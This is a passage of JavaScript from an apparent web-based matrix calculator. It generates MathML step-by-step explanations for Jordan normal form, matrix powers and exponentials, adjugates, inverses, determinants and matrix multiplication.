            html += '<p>' + '<math>' + Expression.p('(A-l*I)**(' + m + '-1)*X', {A: new Expression.Matrix(matrix), l: eigenvalue}, printOptions) + '<mo>&ne;</mo><mn>0</mn>' + '</math>' + ' &rarr; ' + i18n.itIsAGeneralizedEigenvector + '</p>';
            var chain = [];
            chain.push(solution);
            html += '<p>' + i18n.generateAJordanChainForThisGeneralizedEigenvector + '</p>';
            var chainHtml = '';
            chainHtml += '<ol>';
            chainHtml += '<li>';
            chainHtml += '<math>' + Expression.p('v_1=S', {S: new Expression.Matrix(solution)}, printOptions) + '</math>';
            chainHtml += '</li>';
            var s = solution;
            for (var k = 1; k < m; k += 1) {
              var previous = s;
              s = B.multiply(s);
              chain.push(s);
              chainHtml += '<li>';
              chainHtml += '<math>' + Expression.p('v_' + (k + 1) + '=(A-l*I)*S=X', {A: new Expression.Matrix(matrix), l: eigenvalue, S: new Expression.Matrix(previous), X: new Expression.Matrix(s)}, printOptions) + '</math>';
              chainHtml += '</li>';
            }
            chainHtml += '</ol>';
            chain.reverse();
            if (isLinearlyIndependentSet(basisCorrespondingToTheEigenvalue, chain)) {
              var id = containerId + '-' + (blocks.length + 1);
              html += '<table role="presentation" class="anchor-table anchor" id="' + id + '">';
              html += '<tr>';
              html += '<td>';
              html += chainHtml;
              html += '</td>';
              html += '<td>';
              html += '(' + (blocks.length + 1) + ')';
              html += '</td>';
              html += '</tr>';
              html += '</table>';
              links.push('<a href="#' + id + '">(' + (blocks.length + 1) + ')</a>');
              basis = basis.concat(chain);
              basisCorrespondingToTheEigenvalue = basisCorrespondingToTheEigenvalue.concat(chain);
              blocks.push({
                size: m,
                eigenvalue: eigenvalue
              });
            } else {
              html += chainHtml;
            }
          } else {
            html += '<p>' + '<math>' + Expression.p('(A-l*I)**(' + m + '-1)*X=0', {A: new Expression.Matrix(matrix), l: eigenvalue}, printOptions) + '</math>' + ' &rarr; ' + i18n.itIsNotAGeneralizedEigenvector + '</p>';
          }
          html += '</li>';
        }
        html += '</ol>';
        html += '</li>';
      }
      html += '</ol>';
      
      html += '<p>' + i18n.theJordanChainsMakeBasis.replace(/\$\{links\}/g, links.slice(-basisCorrespondingToTheEigenvalue.length).join(', ')) + '</p>';
      html += '</li>';
    }
    html += '</ol>';
    html += '</li>';
    html += '<li>';
    var J = matrixFromBlocks(blocks);
    var P = matrixFromBasis(basis).transpose();
    var P_INVERSED = P.isExact() ? P.inverse() : Expression._getInverse(A, eigenvalues, multiplicities, P);

    html += '<p>' + i18n.generalizedModalMatrix.replace(/\$\{links\}/g, links.join(', ')) + '</p>';
    html += '<math>' + Expression.p('M=S', {S: new Expression.Matrix(P)}, printOptions) + '</math>';
    html += '<p>' + i18n.JordanMatrix + '</p>';
    html += '<math>' + Expression.p('J=S', {S: new Expression.Matrix(J)}, printOptions) + '</math>';
    html += '</li>';
    html += '</ol>';

    //TODO: solution steps
    //var html = tmp.html;
    //html += "<div>...</div>";
    //html += "<div>" + i18n.JordanDecompositionLink + "</div>";
    var detailsHTML = "<div class=\"details-container\"><details open=\"open\"><summary>" + i18n.summaryLabel + "</summary><div class=\"indented\">" + html + "</div></details></div>";
    return "<math>" +
           new Expression.Matrix(matrix).toMathML(printOptions) +
           "<mo>" + (J.isExact() ? "=" : "&asymp;") + "</mo>" +
           "<mrow>" +
           new Expression.Matrix(P).toMathML(printOptions) +
           "<mo>&times;</mo>" +
           new Expression.Matrix(J).toMathML(printOptions) +
           "<mo>&times;</mo>" +
           new Expression.Matrix(P_INVERSED).toMathML(printOptions) +
           "</mrow>" +
           "</math>" +
           detailsHTML;
  }
});
//!

function powUsingTransformationsHelper(x) {
  return   "<munder>" +
             "<munder accentunder=\"true\">" +
             "<mrow>" +
             "<mi>P</mi>" +
             "<mo>&times;</mo>" +
             x +
             "<mo>&times;</mo>" +
             "<menclose notation=\"updiagonalstrike\"><msup><mi>P</mi><mrow><mo>&minus;</mo><mn>1</mn></mrow></msup></menclose>" + 
             "<mo>&times;</mo>" +
             "<menclose notation=\"updiagonalstrike\"><mi>P</mi></menclose>" + 
             "<mo>&times;</mo>" + 
             x +
             "<mo>&times;</mo>" +
             "<menclose notation=\"updiagonalstrike\"><msup><mi>P</mi><mrow><mo>&minus;</mo><mn>1</mn></mrow></msup></menclose>" +
             "<mo>&times;</mo><mi>&hellip;</mi><mo>&times;</mo>" +
             "<menclose notation=\"updiagonalstrike\"><mi>P</mi></menclose>" +
             "<mo>&times;</mo>" +
             x +
             "<mo>&times;</mo>" +
             "<msup><mi>P</mi><mrow><mo>&minus;</mo><mn>1</mn></mrow></msup>" +
             "</mrow>" +
             "<mo stretchy=\"true\">&UnderBrace;</mo>" +
             "</munder>" +
             "<mi>n</mi>" +
           "</munder>";
}

function powUsingTransformations(N) {
  return "<math>" +
         Expression.p("A^n=(P*" + N + "*P^-1)^n") +
         "<mo>=</mo>" +
         powUsingTransformationsHelper(Expression.p(N)) +
         "<mo>=</mo>" +
         Expression.p("P*" + N + "^n*P^-1") +
         "</math>";
}

function nthRootUsingTransformations(N) {
  return "<math>" +
         powUsingTransformationsHelper(Expression.p(N + "**(1/n)")) +
         "<mo>=</mo>" +
         Expression.p("P*" + N + "*P^-1") +
         "<mo>=</mo>" +
         Expression.p("A") +
         "</math>";
}


Expression.Details.add({
  type: "pow-using-diagonalization",
  minRows: 2,
  callback: function (printOptions, matrix) {
    return powUsingTransformations("D") + " " + i18n.powUsingDiagonalizationLink;
  }
});
Expression.Details.add({
  type: "pow-using-Jordan-normal-form",
  minRows: 2,
  callback: function (printOptions, matrix) {
    return powUsingTransformations("J") + " " + i18n.powUsingJordanNormalFormLink;
  }
});

Expression.Details.add({
  type: "nth-root-using-diagonalization",
  minRows: 2,
  callback: function (printOptions, matrix) {
    return nthRootUsingTransformations("D") + " " + i18n.nthRootUsingDiagonalizationLink;
  }
});


Expression.Details.add({
  type: "exponential-using-Jordan-canonical-form",
  minRows: 2,
  callback: function (printOptions, matrix) {
    //TODO: when the matrix is already diagonal, when the matrix is a [projection matrix](https://en.wikipedia.org/wiki/Matrix_exponential#Projection_case)
//  Expression.Details.getCallback("exponential-using-Jordan-canonical-form")({}, RPN("{{0,1,0},{0,1,0},{0,0,0}}").matrix);

    var A = matrix;
    var tmp = Expression.getEigenvalues(A);
    var eigenvalues = tmp.eigenvalues;
    var multiplicities = tmp.multiplicities;
    var tmp = Expression.getFormaDeJordan(A, eigenvalues, multiplicities);
    var D = tmp.J.map(function (e, i, j) {
      return i === j ? e : Expression.ZERO;
    });
    var N = tmp.J.map(function (e, i, j) {
      return i !== j ? e : Expression.ZERO;
    });
    var expN = new Expression.Matrix(N).exp().matrix;//TODO: ?
    var expJmN = D.map(function (e, i, j) {
      return i === j ? e.exp() : Expression.ZERO;
    });
    var expA = tmp.P.multiply(expJmN).multiply(expN).multiply(tmp.P_INVERSED);

    var data = {
      A: A,
      P: tmp.P,
      J: tmp.J,
      P_INVERSED: tmp.P_INVERSED,
      N: N,
      JmN: D,
      expN: expN,
      expJmN: expJmN,
      expA: expA
    };
    for (var i in data) {
      if (Object.prototype.hasOwnProperty.call(data, i)) {
        data[i] = new Expression.Matrix(data[i]);
      }
    }

    var html = '';
    html += '<h3>' + i18n.exponentialUsingJordanCanonicalFormLink + '</h3>';
    html += '<math>' + Expression.p('exp(A)=exp(P*J*P^-1)=P*exp(J-N)*exp(N)*P^-1') + '</math>';
    // data.P
    // data.J
    // data.P_INVERSED
    // data.N
    // data.JmN
    // data.expN
    // data.expJmN
    // data.expA

    // 1. Find a matrix in Jordan normal form:
    //   ...
    //   A = P*J*P**(-1) = X*Y*Z
    // 2. Then:
    //   N = M, J-N = M
    // 3. Find the exponential of the Nilpotent matrix (N):
    //   e**N=I+N+1/2*N**2+1/6*N**3+...+1(q-1)!*N**(q-1) (*)[https://en.wikipedia.org/wiki/Matrix_exponential#Nilpotent_case]:
    // ...
    // 4. Find the exponential of the diagonal matrix (J-N):
    //   Exponential can be obtained by exponentiating each entry on the main diagonal (*)[https://en.wikipedia.org/wiki/Matrix_exponential#Diagonalizable_case]:
    //   exp(J-N)=M
    // 5. Then:
    //   exp(A)=X*Y=Z
    
    html += '<ol>';

    html += '<li>';
    html += '<h3>' + i18n.exponential.findAMatrixInJordanNormalForm + '</h3>';
    html += createDetailsSummary(printOptions.idPrefix, [{type: "Jordan-decomposition", matrix: matrix.toString(), second: undefined}]);
    html += '<div>';
    html += '<math>' + Expression.p('A=P*J*P**(-1)') + '</math>' + ':';
    html += '</div>';
    html += '<div>';
    html += '<math>' + Expression.p('A=P*J*V', {A: data.A, P: data.P, J: data.J, V: data.P_INVERSED}, printOptions) + '</math>';
    html += '</div>';
    html += '</li>';

    html += '<li>';
    html += '<h3>' + i18n.exponential.then + '</h3>';
    html += '<div>';
    html += '<math>' + Expression.p('N=M', {M: data.N}, printOptions) + '</math>';
    html += ', ';
    html += '<math>' + Expression.p('J-N=M', {M: data.JmN}, printOptions) + '</math>';
    html += '</div>';
    html += '</li>';

    html += '<li>';
    html += '<h3>' + i18n.exponential.findTheExponentialOfTheNilpotentMatrixN.replace(/\$\{N\}/g, '<math><mi>N</mi></math>') + '</h3>';
    html += '<div>';
    // \u22EF == &hellip;
    html += '<math>' + Expression.p('e**N=I+N+1/2*N**2+1/6*N**3+a+1/f*N**k').replace(/<mi>a<\/mi>/g, '<mi>&hellip;</mi>').replace(/<mi>f<\/mi>/g, '<mrow><mi>k</mi><mo>!</mo></mrow>') + '</math>' + ' ' + i18n.exponential.exponentialOfNilpotentMatrixLink + ':';
    html += '</div>';
    //TODO: steps
    html += '<div>';
    html += '<math>' + Expression.p('e**N=M', {M: data.expN}, printOptions) + '</math>';
    html += '</div>';
    html += '</li>';

    html += '<li>';
    html += '<h3>' + i18n.exponential.findTheExponentialOfTheDiagonalMatrixD.replace(/\$\{D\}/g, '<math><mi>J</mi>&minus;<mi>N</mi></math>') + '</h3>';
    html += '<div>';
    html += i18n.exponential.exponentialOfDiagonalMatrix;
    html += '</div>';
    html += '<div>';
    html += '<math>' + Expression.p('e**(J-N)=M', {M: data.expJmN}, printOptions) + '</math>';
    html += '</div>';
    html += '</li>';

    html += '<li>';
    html += '<h3>' + i18n.exponential.then + '</h3>';
    html += '<div>';
    html += '<math>' + Expression.p('exp(A)=P*X*Y*V=M', {A: data.A, P: data.P, X: data.expJmN, Y: data.expN, V: data.P_INVERSED, M: data.expA}, printOptions) + '</math>';
    html += '</div>';
    html += '</li>';

    html += '</ol>';

    //TODO:...
    return html;
  }
});

var getAdjugateByDefinition = function (printOptions, matrix) {
    var result = "";
    var cofactors = new Array(matrix.rows());
    for (var i = 0; i < matrix.rows(); i += 1) {
      cofactors[i] = new Array(matrix.cols());
      for (var j = 0; j < matrix.cols(); j += 1) {
        result += "<div>";// TODO: <ul> - ?
        result += "<math>";
        result += Expression.p('C_(' + (i + 1) + ',' + (j + 1) + ')');
        result += '<mo>=</mo>';
        result += '<mrow>';
        result += Expression.p("(-1)^(i+j)", {i: Expression.Integer.fromNumber(i + 1), j: Expression.Integer.fromNumber(j + 1)}, printOptions);
        result += "<mo>&times;</mo>";
        result += new Expression.Minor(new Expression.Matrix(matrix), i, j).toMathML(printOptions);
        result += '</mrow>';
        var minorMatrix = matrix.minorMatrix(i, j);
        var minor = minorMatrix.determinant();
        var isOdd = (i + j) - 2 * Math.floor((i + j) / 2);
        var n = isOdd === 1 ? Expression.ONE.negate() : Expression.ONE;
        var c = n.multiply(minor);

        if (minorMatrix.rows() === 2) {//!
          result += "<munder><mo>=</mo><mtext>" + i18n.determinant2x2Link + "</mtext></munder>";
          result += Expression.p("n*(a*d-b*c)", {
            n: n,
            a: minorMatrix.e(0, 0),
            b: minorMatrix.e(0, 1),
            c: minorMatrix.e(1, 0),
            d: minorMatrix.e(1, 1)
          }, printOptions);
        }
        if (isOdd === 1) {
          result += "<mo>=</mo>";
          result += Expression.p("n*(d)", {
            n: n,
            d: minor
          }, printOptions);
        }
        result += "<mo>=</mo>";
        result += Expression.p("c", {c: c}, printOptions);
        result += "</math>";
        if (minorMatrix.rows() !== 2) {//!
          result += createDetailsSummary(printOptions.idPrefix, [{type: minorMatrix.getDeterminantEventType("determinant").type, matrix: minorMatrix.toString(), second: undefined}]);
        }
        cofactors[i][j] = c;
        result += "</div>";
      }
    }
    var CT = new Expression.Matrix(new Matrix(cofactors).transpose());
    return {result: result, CT: CT};
};

Expression.Details.add({
  type: "adjugate-by-definition",
  i18n: undefined,
  minRows: 2, //?
  maxRows: undefined,
  priority: 0,
  callback: function (printOptions, matrix) {
    var tmp = getAdjugateByDefinition(printOptions, matrix);
    var result = tmp.result;
    var CT = tmp.CT;
    result += "<div>";
    result += "<math>";
    result += Expression.p("adjugate(A)=C^T=Y", {A: new Expression.Matrix(matrix), Y: CT}, printOptions);
    result += "</math>";
    result += " ";
    result += i18n.adjugateMatrixLink;//TODO:
    result += "</div>";
    return result;
  }
});

Expression.Details.add({
  type: "inverse-adjugate",
  i18n: function () {
    return i18n.inverseDetailsUsingAdjugateMatrix;
  },
  priority: 0,
  callback: function (printOptions, matrix) {
    var result = "";
    result += "<div>";
    result += "<math>";
    result += Expression.p("A^-1=1/determinant(A)*C^T=1/determinant(A)*X", {X: new Expression.Matrix(matrix.map(function (e, i, j) {
      return new Expression.Symbol('C_(' + (j + 1) + ',' + (i + 1) + ')');
    }))}, printOptions);
    result += "</math>";
    result += " ";
    result += i18n.inverseDetailsUsingAdjugateMatrixLink;//TODO
    result += "</div>";
    // https://upload.wikimedia.org/math/e/f/0/ef0d68882204598592f50ba054e9951e.png
    var determinant = matrix.determinant();
    result += "<div>";
    result += "<math>";
    result += Expression.p("determinant(A)=X=y", {
      X: new Expression.Determinant(new Expression.Matrix(matrix)),
      y: determinant
    }, printOptions);
    result += "</math>";
    result += createDetailsSummary(printOptions.idPrefix, [{type: matrix.getDeterminantEventType("determinant").type, matrix: matrix.toString(), second: undefined}]);
    result += "</div>";
  if (determinant.equals(Expression.ZERO)) {
    //TODO: ?
  } else {//!
    var tmp = getAdjugateByDefinition(printOptions, matrix);
    result += tmp.result;
    var CT = tmp.CT;
    // TODO: linkes
    // http://en.wikipedia.org/wiki/Cramer%27s_rule#Finding_inverse_matrix
    result += "<div>";
    result += "<math>";
    result += Expression.p("A^-1=1/determinant(A)*C^T=1/x*Y=Z", {x: determinant, Y: CT, Z: determinant.inverse().multiply(CT)}, printOptions);
    result += "</math>";
    result += "</div>";
  }
    return result;
  }
});

  // new Intl.NumberFormat("it-u-nu-roman").format(n);
  var roman = function (n) {
    var digits = "IVXLCDM";
    var i = digits.length + 1;
    var result = "";
    var value = 1000;
    while ((i -= 2) >= 0) {
      var v = Math.floor(value / 10);
      var j = -1;
      while (++j < 2) {
        while (n >= value) {
          n -= value;
          result += digits.slice(i - j, i - j + 1);
        }
        value -= v;
        while (n >= value) {
          n -= value;
          result += digits.slice(i - 2, i - 2 + 1) + digits.slice(i - j, i - j + 1);
        }
        value -= 4 * v;
      }
      value = v;
    }
    return result;
  };

  //TODO: remove
  var getMatrixRowDenotation = function (i) {
    return i18n.matrixRowDenotation.replace(/\$\{i\}/g, i.toString())
                                   .replace(/\$\{i\:roman\}/g, roman(i));
  };

Matrix.prototype.getDeterminantEventType = function (base) {
  for (var i = 0; i < this.rows(); i += 1) {
    var isZero = true;
    for (var j = 0; j < this.cols(); j += 1) {
      var e = this.e(i, j);
      if (!e.equals(Expression.ZERO)) {
        isZero = false;
      }
    }
    if (isZero) {
      return {
        type: "special-determinant",
        row: i,
        col: -1
      };
    }
  }
  for (var j = 0; j < this.cols(); j += 1) {
    var isZero = true;
    for (var i = 0; i < this.rows(); i += 1) {
      var e = this.e(i, j);
      if (!e.equals(Expression.ZERO)) {
        isZero = false;
      }
    }
    if (isZero) {
      return {
        type: "special-determinant",
        row: -1,
        col: j
      };
    }
  }
  return {
    type: base,
    row: -1,
    col: -1
  };
};

//!new
Expression.Details.add({
  type: "special-determinant",
  i18n: undefined,
  priority: 0,
  minRows: 1,//TODO: add a test
  callback: function (printOptions, matrix) {
    var html = "";
    
    var x = matrix.getDeterminantEventType();

    html += "<div>";
    html += "<math>";
    html += new Expression.Determinant(new Expression.Matrix(matrix)).toMathML(Object.assign({}, printOptions, {
      highlightRow: x.row !== -1 ? x.row : undefined,
      highlightCol: x.col !== -1 ? x.col : undefined
    })) + "<mo>=</mo><mn>0</mn>";
    html += "</math>";
    if (x.row !== -1 || x.col !== -1) {
      html += "<div>" + i18n.zeroRowColumn + "</div>";
    }
    html += "</div>";

    return html;
  }
});





Expression.Details.add({
  type: "multiply",
  i18n: function () {
    return i18n.matrixMultiplication;
  },
  minRows: 1,
  maxRows: undefined,
  priority: 1,
  callback: function (printOptions, matrixA, matrixB) {
    var html = "";
    html += "<p>" + i18n.matrixMultiplicationInfo + "</p>";
    //TODO: Should matrixA and matrixB already have NonSimplifiedExpressions-elements ???
    var matrixAn = matrixA.map(function (e, i, j) {return new NonSimplifiedExpression(e);});
    var matrixBn = matrixB.map(function (e, i, j) {return new NonSimplifiedExpression(e);});

    var matrixAB = matrixAn.multiply(matrixBn);
    var resultOfMultiplication = matrixAB.map(function (e, i, j) {return e.simplify();});
    html += "<math>";
    html += "<mrow>";
    html += new Expression.Matrix(matrixAn).toMathML(Object.assign({}, printOptions, {
      cellIdGenerator: function (i, j) {
        return matrixAn.e(i, j).getId();
      }
    }));
    html += "<mo>&times;</mo>";
    html += new Expression.Matrix(matrixBn).toMathML(Object.assign({}, printOptions, {
      cellIdGenerator: function (i, j) {
        return matrixBn.e(i, j).getId();
      }
    }));
    html += "</mrow>";
    html += "<mo>=</mo>";
    html += new Expression.Matrix(matrixAB).toMathML(Object.assign({}, printOptions, {
      cellIdGenerator: function (i, j) {
        return matrixAB.e(i, j).getId();
      }
    }));
    html += "<mo>=</mo>";
    html += new Expression.Matrix(resultOfMultiplication).toMathML(printOptions);
    html += "</math>";
    //TODO: highlight of "same" expression elements, when mouseover an element of matrixAB or matrixA or matrixB
    matrixAB.map(function (e, i, j) {
      html += "<a class=\"a-highlight\" data-for=\"" + e.getId().toString() + "\" data-highlight=\"" + e.unwrap().getIds() + "\"></a>";
      return e;
    });

    return html;
  }
});

Expression.Details.add({
  type: "pow",
  i18n: function () {
    return i18n.matrixMultiplication;
  },
  minRows: 1,
  maxRows: undefined,
  priority: 1,
  callback: function (printOptions, matrix, second) {
    var n = Number.parseInt(second.e(0, 0).toString(), 10);
    // n >= 1 (?)
    var i = 0;
    var c = 1;
    var t = [];
    t.push(matrix);
    var html = "<ul>";
    html += "<li>";
    html += "<math>";
    html += Expression.p("A") + "<mo>=</mo>" + new Expression.Matrix(t[i]).toMathML(printOptions);
    html += "</math>";
    html += "</li>";
    while (c * 2 <= n) {
      c *= 2;
      t.push(t[i].multiply(t[i]));
      html += "<li>";
      html += "<math>";
      html += Expression.p("A^" + c) + "<mo>=</mo>" + Expression.p("A^" + Math.floor(c / 2) + "*" + "A^" + Math.floor(c / 2)) + "<mo>=</mo>" + new Expression.Matrix(t[i + 1]).toMathML(printOptions);
      html += "</math>";
      html += "</li>";
      i += 1;
    }
    html += "</ul>";
    var result = undefined;
    var r = undefined;
    var nn = n;
    while (i !== -1 && nn !== 0) {
      if (nn >= c) {
        nn -= c;
        result = result == undefined ? t[i] : result.multiply(t[i]);
        var z = new Expression.NonSimplifiedExpression(new Expression.Symbol("A").pow(Expression.Integer.fromNumber(c)));
        r = r == undefined ? z : r.multiply(z);
      }
      c = Math.floor(c / 2);
      i -= 1;
    }
    html += "<math>";
    html += Expression.p("A^" + n) + "<mo>=</mo>" + r.toMathML(printOptions) + "<mo>=</mo>" + new Expression.Matrix(result).toMathML(printOptions);
    html += "</math>";
    return html;
  }
});

Expression.someDetailsNew = {
  "determinant2x2": "<span data-custom-paint=\"custom-menclose\" data-color=\"0a\" data-cells=\"[[0,0],[1,1]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"1a\" data-cells=\"[[0,1],[1,0]]\"><math><mrow><mo>|</mo><mtable rowspacing=\"0ex\"><mtr><mtd><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd></mtr><mtr><mtd><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd></mtr></mtable><mo>|</mo></mrow><mo>=</mo><mrow><mrow mathcolor=\"#D64040\"><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>1</mn></mrow></msub><mo>&times;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mrow><mo>&minus;</mo><mrow mathcolor=\"#4040D6\"><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>2</mn></mrow></msub><mo>&times;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mrow></mrow></math></span></span>${link}",
  "determinant3x3": "<math><mrow><mo>|</mo><mtable rowspacing=\"0ex\"><mtr><mtd><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mtd></mtr><mtr><mtd><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mtd></mtr><mtr><mtd><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mtd></mtr></mtable><mo>|</mo></mrow></math><math><mo>=</mo></math>",
  "matrix3x3": "<math><mtable rowspacing=\"0ex\"><mtr><mtd><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mtd></mtr><mtr><mtd><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mtd></mtr><mtr><mtd><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mtd><mtd><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mtd></mtr></mtable></math>",
  "determinantTriangle": "${determinant3x3}<table class=\"some-details-table\"><tr><td><math><mrow><mo>+</mo><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mrow><mo>&times;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>2</mn></mrow></msub><mo>&times;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></math></td><td><span data-custom-paint=\"custom-menclose\" data-color=\"0a\" data-cells=\"[[0,0],[1,1],[2,2]]\">${matrix3x3}</span></td></tr><tr><td><math><mrow><mo>+</mo><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mrow><mo>&times;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>3</mn></mrow></msub><mo>&times;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></math></td><td><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,0],[1,1],[2,2]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0a\" data-cells=\"[[0,1],[1,2],[2,0]]\">${matrix3x3}</span></span></td></tr><tr><td><math><mrow><mo>+</mo><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mrow><mo>&times;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>1</mn></mrow></msub><mo>&times;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></math></td><td><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,0],[1,1],[2,2]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,1],[1,2],[2,0]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0a\" data-cells=\"[[0,2],[1,0],[2,1]]\">${matrix3x3}</span></span></span></td></tr><tr><td><math><mrow><mo>&minus;</mo><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></mrow><mo>&times;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>2</mn></mrow></msub><mo>&times;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></math></td><td><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,0],[1,1],[2,2]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,1],[1,2],[2,0]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,2],[1,0],[2,1]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"1a\" data-cells=\"[[2,0],[1,1],[0,2]]\">${matrix3x3}</span></span></span></span></td></tr><tr><td><math><mrow><mo>&minus;</mo><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>1</mn></mrow></msub></mrow><mo>&times;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>3</mn></mrow></msub><mo>&times;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></math></td><td><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,0],[1,1],[2,2]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,1],[1,2],[2,0]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,2],[1,0],[2,1]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"1\" data-cells=\"[[2,0],[1,1],[0,2]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"1a\" data-cells=\"[[2,1],[1,2],[0,0]]\">${matrix3x3}</span></span></span></span></span></td></tr><tr><td><math><mrow><mo>&minus;</mo><msub><mi>a</mi><mrow><mn>1</mn><mo>&ic;</mo><mn>2</mn></mrow></msub></mrow><mo>&times;</mo><msub><mi>a</mi><mrow><mn>2</mn><mo>&ic;</mo><mn>1</mn></mrow></msub><mo>&times;</mo><msub><mi>a</mi><mrow><mn>3</mn><mo>&ic;</mo><mn>3</mn></mrow></msub></math>${link}</td><td><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,0],[1,1],[2,2]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,1],[1,2],[2,0]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"0\" data-cells=\"[[0,2],[1,0],[2,1]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"1\" data-cells=\"[[2,0],[1,1],[0,2]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"1\" data-cells=\"[[2,1],[1,2],[0,0]]\"><span data-custom-paint=\"custom-menclose\" data-color=\"1a\" data-cells=\"[[2,2],[1,0],[0,1]]\">${matrix3x3}</span></span></span></span></span></span></td></tr></table>",
